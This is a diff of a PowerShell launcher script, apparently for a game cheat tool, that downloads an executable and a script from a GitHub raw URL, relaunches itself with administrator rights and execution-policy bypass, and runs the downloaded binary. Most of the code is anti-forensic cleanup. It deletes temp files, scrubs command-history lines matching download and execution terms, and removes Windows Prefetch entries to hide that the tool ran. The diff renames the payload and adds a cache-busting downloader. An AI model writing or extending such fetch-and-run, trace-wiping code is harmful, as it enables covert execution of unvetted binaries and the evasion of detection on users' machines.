@@ -1,11 +1,11 @@
 param(
-    [string]$ExeUrl = 'https://raw.githubusercontent.com/lubyralph6-maker/GODX.ps1/main/Libery32.exe',
+    [string]$ExeUrl = 'https://raw.githubusercontent.com/lubyralph6-maker/GODX.ps1/main/Privy64.exe',
     [string]$ScriptUrl = 'https://raw.githubusercontent.com/lubyralph6-maker/GODX.ps1/main/GODX.ps1'
 )
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$script:MarkerDir = Join-Path $env:LOCALAPPDATA 'GODXPROJECT'
+$script:MarkerDir = Join-Path $env:LOCALAPPDATA 'GODX-BUILDS'
 $script:MarkerFile = Join-Path $script:MarkerDir '.launcher_paths'
 
 function Register-CleanupPath {
@@ -24,7 +24,7 @@ function Invoke-LauncherCleanup {
 
     foreach ($p in $ExtraPaths) {
         Register-CleanupPath $p
-    }
+    } 
 
     if ($PSCommandPath -and ($PSCommandPath.StartsWith($env:TEMP, [System.StringComparison]::OrdinalIgnoreCase))) {
         Register-CleanupPath $PSCommandPath
@@ -47,12 +47,12 @@ function Invoke-LauncherCleanup {
     if (Test-Path $localTemp) { $tempRoots += $localTemp }
 
     foreach ($root in $tempRoots) {
-        foreach ($glob in @('god_*.ps1', 'GOD_run.ps1', 'run.ps1', 'god.tmp', 'g.ps1', 'ps-script-*.ps1')) {
+        foreach ($glob in @('godx_*.ps1', 'god_*.ps1', 'GODX_run.ps1', 'GOD_run.ps1', 'run.ps1', 'god.tmp', 'g.ps1', 'ps-script-*.ps1')) {
             Get-ChildItem -Path $root -Filter $glob -ErrorAction SilentlyContinue |
                 Remove-Item -Force -ErrorAction SilentlyContinue
         }
         Get-ChildItem -Path $root -ErrorAction SilentlyContinue |
-            Where-Object { $_.Name -match 'GOD|godxproject|GODXPROJECT|Libery32|libery32|god_|l32_' } |
+            Where-Object { $_.Name -match 'GODX|GOD|Privy64|privy64|godxproject|GODX-BUILDS|Libery32|libery32|godx_|god_|l32_' } |
             Remove-Item -Force -ErrorAction SilentlyContinue
     }
 
@@ -73,7 +73,7 @@ function Invoke-LauncherCleanup {
 function Clear-LauncherHistory {
     param([string]$ExtraPattern = '')
 
-    $historyPattern = 'discord|cmd|god|GOD|godxproject|GODXPROJECT|Champions|libery32|Libery32|god_|l32_|irm|iex|Invoke-WebRequest|Invoke-RestMethod|WebClient|DownloadFile|OutFile|UseBasicParsing|raw\.githubusercontent|lubyralph6-maker|ExecutionPolicy|powershell.*bypass|Start-Process.*powershell|Remove-Item|del /f|timeout /t|launcher_paths|Invoke-LauncherCleanup|wpn_scan|wpn_patch|wpn_float|original_aob|patch_value|keyauth|\.ps1|\.exe'
+    $historyPattern = 'discord|cmd|godx|GODX|god|GOD|Privy64|privy64|godxproject|GODX-BUILDS|Champions|libery32|Libery32|godx_|god_|l32_|irm|iex|Invoke-WebRequest|Invoke-RestMethod|WebClient|DownloadFile|OutFile|UseBasicParsing|raw\.githubusercontent|lubyralph6-maker|ExecutionPolicy|powershell.*bypass|Start-Process.*powershell|Remove-Item|del /f|timeout /t|launcher_paths|Invoke-LauncherCleanup|wpn_scan|wpn_patch|wpn_float|original_aob|patch_value|keyauth|\.ps1|\.exe'
     if ($ExtraPattern) { $historyPattern += '|' + $ExtraPattern }
 
     $historyPaths = @(
@@ -102,6 +102,7 @@ function Clear-LauncherPrefetch {
         if ($RandomName) {
             Remove-Item ('C:\Windows\Prefetch\*' + $RandomName + '*') -Force -ErrorAction SilentlyContinue
         }
+        Remove-Item 'C:\Windows\Prefetch\*PRIVY64*' -Force -ErrorAction SilentlyContinue
         Remove-Item 'C:\Windows\Prefetch\*LIBERY32*' -Force -ErrorAction SilentlyContinue
         Remove-Item 'C:\Windows\Prefetch\POWERSHELL.EXE*.pf' -Force -ErrorAction SilentlyContinue
         Remove-Item 'C:\Windows\Prefetch\PWSH.EXE*.pf' -Force -ErrorAction SilentlyContinue
@@ -110,10 +111,23 @@ function Clear-LauncherPrefetch {
     } catch {}
 }
 
+function Download-FreshExe {
+    param(
+        [string]$Url,
+        [string]$Destination
+    )
+
+    $cacheBust = $Url + '?cb=' + [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
+    $client = New-Object Net.WebClient
+    $client.Headers.Add('Cache-Control', 'no-cache')
+    $client.Headers.Add('Pragma', 'no-cache')
+    $client.DownloadFile($cacheBust, $Destination)
+}
+
 function Start-ElevatedSelf {
-    $tmp = Join-Path $env:TEMP ('god_' + [guid]::NewGuid().ToString('N') + '.ps1')
+    $tmp = Join-Path $env:TEMP ('godx_' + [guid]::NewGuid().ToString('N') + '.ps1')
     Register-CleanupPath $tmp
-    (New-Object Net.WebClient).DownloadFile($ScriptUrl, $tmp)
+    Download-FreshExe $ScriptUrl $tmp
     Start-Process powershell.exe -Verb RunAs -ArgumentList @('-nop', '-ep', 'bypass', '-NoExit', '-File', $tmp)
 }
 
@@ -131,11 +145,11 @@ $tempExe = Join-Path $env:TEMP ($randomName + '.exe')
 Register-CleanupPath $tempExe
 
 $downloaded = $false
-foreach ($url in @($ExeUrl, 'https://raw.githubusercontent.com/lubyralph6-maker/GODX.ps1/main/Libery32.exe')) {
+foreach ($url in @($ExeUrl)) {
     if ([string]::IsNullOrWhiteSpace($url)) { continue }
     try {
         Write-Host ('Downloading: ' + $url) -ForegroundColor Cyan
-        (New-Object Net.WebClient).DownloadFile($url, $tempExe)
+        Download-FreshExe $url $tempExe
         if ((Test-Path $tempExe) -and ((Get-Item $tempExe).Length -gt 100000)) {
             $downloaded = $true
             break
@@ -148,7 +162,7 @@ foreach ($url in @($ExeUrl, 'https://raw.githubusercontent.com/lubyralph6-maker/
 }
 
 if (-not $downloaded) {
-    Write-Host 'Download failed. Upload Libery32.exe to GitHub first.' -ForegroundColor Red
+    Write-Host 'Download failed. Upload Privy64.exe to GitHub first.' -ForegroundColor Red
     Clear-LauncherHistory -ExtraPattern $randomName
     Clear-LauncherPrefetch -RandomName $randomName
     Invoke-LauncherCleanup
@@ -156,7 +170,7 @@ if (-not $downloaded) {
     exit 1
 }
 
-Write-Host 'Downloaded' -ForegroundColor Green
+Write-Host 'Downloaded Privy64' -ForegroundColor Green
 $proc = Start-Process -FilePath $tempExe -PassThru
 $proc.WaitForExit()
 Start-Sleep -Seconds 2
